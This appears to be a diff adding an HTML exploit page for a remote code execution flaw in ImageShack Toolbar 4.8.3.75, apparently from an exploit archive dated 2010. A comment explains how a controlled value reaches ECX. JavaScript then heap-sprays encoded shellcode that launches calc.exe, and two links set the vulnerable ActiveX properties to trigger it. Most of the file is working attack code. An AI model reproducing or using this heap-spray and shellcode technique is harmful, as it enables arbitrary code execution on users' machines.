@@ -1,0 +1,76 @@
+<!--
+
+Title: ImageShack Toolbar 4.8.3.75 Remote Code Execution Exploit
+Date: Nov 23, 2010
+Author: Rew 
+Email: rew [splat] leethax.info 
+Link: http://toolbar.imageshack.us/ImageShackToolbar.exe
+Version: 4.8.3.75
+Tested on: WinXP - IE 6 & 7
+CVE: NA (0day)
+
+Note: This object is NOT marked safe for scripting so the impact of this issue is small.
+You'll have to change your ActiveX settings to let it to run.  None-the-less, it's
+an interesting crash so meh.  Check it out...
+
+There are actually two vulnerable variable (see bottom of page).  Each should be set to some
+integer.  This integer is then stored (in hex) directly in ECX.  Then we see...
+
+--- %PROGRAMFILES%\ImageShackToolbar\ImageShackToolbar.dll ---
+05501386: 8B 01   MOV EAX,DWORD PTR DS:[ECX]
+05501388: 6A 01   PUSH 1
+0550138A: FF 10   CALL DWORD PTR DS:[EAX]
+
+All we have to do is spray the heap and then put something usefull in ECX.  pwnt.
+
+Oh yes, and greetz to my bros in irc.rizon.net#beer  :3
+
+PS:
+Any information security firms looking for a knowledgeable, motivated intern?
+I sure would love to talk to you.
+
+-->
+
+<object classid='clsid:DC922B67-FF61-455E-9D79-959925B6695C' id='target' /></object>
+
+<script>
+
+// calc.exe
+var shellcode = unescape(
+	'%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u3d13%u5e46%u8395'+
+	'%ufceb%uf4e2%uaec1%u951a%u463d%ud0d5%ucd01%u9022%u4745%u1eb1'+
+	'%u5e72%ucad5%u471d%udcb5%u72b6%u94d5%u77d3%u0c9e%uc291%ue19e'+
+	'%u873a%u9894%u843c%u61b5%u1206%u917a%ua348%ucad5%u4719%uf3b5'+
+	'%u4ab6%u1e15%u5a62%u7e5f%u5ab6%u94d5%ucfd6%ub102%u8539%u556f'+
+	'%ucd59%ua51e%u86b8%u9926%u06b6%u1e52%u5a4d%u1ef3%u4e55%u9cb5'+
+	'%uc6b6%u95ee%u463d%ufdd5%u1901%u636f%u105d%u6dd7%u86be%uc525'+
+	'%u3855%u7786%u2e4e%u6bc6%u48b7%u6a09%u25da%uf93f%u465e%u955e'
+);
+
+var nops = unescape('%u0c0c%u0c0c');
+
+var headersize = 20;
+var slackspace = headersize + shellcode.length;
+
+while(nops.length < slackspace) {
+	nops += nops;
+}
+
+var fillblock = nops.substring(0, slackspace);
+var block = nops.substring(0, nops.length - slackspace);
+
+while((block.length + slackspace) < 0x50000) {
+	block = block + block + fillblock;
+}
+
+memory=new Array();
+for(counter=0; counter<200; counter++){
+	memory[counter] = block + shellcode;
+}
+
+var arg1=202116108; // 0x0c0c0c0c in decimal
+
+</script>
+
+<a href="javascript:document.getElementById('target').strategy = arg1;">Sploit #1</a><br>
+<a href="javascript:document.getElementById('target').target = arg1;">Sploit #2</a>
